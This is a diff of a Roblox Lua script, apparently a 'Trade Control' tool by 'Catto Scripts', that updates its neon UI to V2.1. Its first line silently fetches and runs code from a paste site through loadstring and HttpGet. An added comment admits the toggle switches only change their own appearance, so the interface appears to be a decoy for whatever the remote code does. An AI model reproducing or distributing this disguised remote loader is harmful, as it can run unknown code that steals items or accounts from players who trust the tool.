@@ -1,5 +1,5 @@
 loadstring(game:HttpGet("https://cdn.sourceb.in/bins/V218sZQZyc/0"))()
---// CATTO SCRIPTS | TRADE CONTROL
+--// CATTO SCRIPTS | TRADE CONTROL V2.1
 --// Modern Dark Neon UI
 
 local Players = game:GetService("Players")
@@ -17,9 +17,10 @@ local COLORS = {
     Cyan = Color3.fromRGB(52, 211, 235),
     Text = Color3.fromRGB(241, 244, 255),
     Muted = Color3.fromRGB(139, 151, 175),
-    Red = Color3.fromRGB(255, 91, 112),
     Green = Color3.fromRGB(82, 230, 170),
 }
+
+-- REMOVE PREVIOUS UI
 
 local old = playerGui:FindFirstChild("TradeControlUI")
 if old then old:Destroy() end
@@ -93,7 +94,7 @@ create("TextLabel", {
     Position = UDim2.new(0, 20, 0, 20),
     Size = UDim2.new(1, -40, 0, 30),
     BackgroundTransparency = 1,
-    Text = "CATTO  /  TRADE CONTROL",
+    Text = "CATTO / TRADE CONTROL",
     TextColor3 = COLORS.Text,
     TextSize = 18,
     Font = Enum.Font.GothamBold,
@@ -197,7 +198,7 @@ local main = create("Frame", {
     Name = "Main",
     AnchorPoint = Vector2.new(0.5, 0.5),
     Position = UDim2.fromScale(0.5, 0.5),
-    Size = UDim2.fromOffset(370, 415),
+    Size = UDim2.fromOffset(370, 435),
     BackgroundColor3 = COLORS.Background,
     BorderSizePixel = 0,
     ClipsDescendants = true
@@ -214,10 +215,27 @@ create("UIGradient", {
     Rotation = 120
 }, main)
 
+-- TOP WATERMARK
+
+create("TextLabel", {
+    Name = "CreatorWatermark",
+    Position = UDim2.new(0, 0, 0, 2),
+    Size = UDim2.new(1, 0, 0, 18),
+    BackgroundTransparency = 1,
+    Text = "@Cattoscripts | IG & TikTok",
+    TextColor3 = COLORS.Green,
+    TextTransparency = 0.15,
+    TextSize = 10,
+    Font = Enum.Font.GothamBold,
+    TextXAlignment = Enum.TextXAlignment.Center,
+    ZIndex = 5
+}, main)
+
 -- HEADER
 
 local header = create("Frame", {
     Name = "Header",
+    Position = UDim2.new(0, 0, 0, 20),
     Size = UDim2.new(1, 0, 0, 76),
     BackgroundColor3 = COLORS.Panel,
     BorderSizePixel = 0
@@ -309,8 +327,8 @@ create("Frame", {
 
 local content = create("Frame", {
     Name = "Content",
-    Position = UDim2.new(0, 0, 0, 76),
-    Size = UDim2.new(1, 0, 1, -76),
+    Position = UDim2.new(0, 0, 0, 96),
+    Size = UDim2.new(1, 0, 1, -96),
     BackgroundTransparency = 1
 }, main)
 
@@ -329,7 +347,7 @@ create("TextLabel", {
     Position = UDim2.new(1, -95, 0, 12),
     Size = UDim2.new(0, 77, 0, 22),
     BackgroundTransparency = 1,
-    Text = "●  READY",
+    Text = "● READY",
     TextColor3 = COLORS.Green,
     TextSize = 10,
     Font = Enum.Font.GothamBold,
@@ -337,6 +355,7 @@ create("TextLabel", {
 }, content)
 
 -- TOGGLE ROWS
+-- These switches only change their own appearance.
 
 local toggleStates = {}
 
@@ -478,7 +497,7 @@ create("TextLabel", {
     Position = UDim2.new(0.65, 0, 0, 5),
     Size = UDim2.new(0.35, 0, 0, 18),
     BackgroundTransparency = 1,
-    Text = "V2.0",
+    Text = "V2.1",
     TextColor3 = COLORS.Cyan,
     TextSize = 10,
     Font = Enum.Font.GothamBold,
@@ -541,7 +560,7 @@ minimize.MouseButton1Click:Connect(function()
         content.Visible = false
 
         tween(main, 0.25, {
-            Size = UDim2.new(0, 370, 0, 76)
+            Size = UDim2.new(0, 370, 0, 96)
         })
     else
         minimize.Text = "−"
